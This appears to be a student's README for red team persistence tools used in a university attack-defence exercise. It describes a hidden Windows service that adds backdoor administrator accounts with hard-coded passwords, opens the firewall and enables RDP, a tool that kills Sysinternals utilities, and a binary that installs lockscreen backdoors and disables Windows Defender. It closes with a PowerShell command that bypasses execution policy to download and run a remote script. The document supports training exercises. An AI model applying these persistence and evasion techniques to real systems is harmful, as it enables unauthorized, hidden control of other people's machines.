# My Goodies for UB Fall 2018

Im writing this documentation in effort to promote the fact that we all need
to improve our documentation, from commenting code, to actually writing docs
on how to use our tools. Even if no one else does, I will make an effort to 
document my tools from now on, as I am graduating soon and I still want them
to be able to be used by new red team members. So without further ado, here
is a list of the tools I will be using/used during UB Fall 2018.

## ansible

Total credit goes to Ben. I just edited the code and made it fit my style. 
This is going the main deplyoment method. Using Invoke-GenerateHosts, you 
should be able to generate a hosts file. From there, put sandwoman.exe and 
honeybadger into the services folder, the gscript binary into the exe folder, 
and the codesigning cert into the cert folder. This will deploy and install/run
all the binaries in the folders as well as importing the root CA.

`Usage: blah blah blah`

## sandwoman

This is going to be the bread and butter of keep persisatance on Windows Hosts. While
ansible should take care of deployment, if you wish to manually deploy, do the following:

`Usage: sandwoman.exe -install`

### sandwoman features

- Add interns and a Manager account that are domain/local administrators
- Add allow any inbound and outbound in firewall
- Enable RDP
- Process Protection via SCM
- Service does not get displayed in SCM

`Login Info: Manager:Password-123!`
`Login Info: InternXXX:Password-123!`

## honeybadger (DcomEM.exe)

This is a shitty service I wrote a while back and is more meant to be something that
blue team finds. Regardless, it just looks for sys internal tools in the process list
and kills them. It also looks for the sys internal tools file and deletes them.

`Usage: DcoEM.exe -install`

## funtimes.exe

This is my gscript binary. This will automate a lot of the registry persistance and perform
a lot of tasks that would be a pain in the ass for my service to run. Here is what is
included in the binary:

- Lockscreen backdoors
- Enables SMBv1
- Shortens log size
- Disabled Windows Defender

powershell.exe -noprofile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex ((new-object net.webclient).DownloadString("https://github.com/ansible/ansible/raw/devel/examples/scripts/ConfigureRemotingForAnsible.ps1"))"
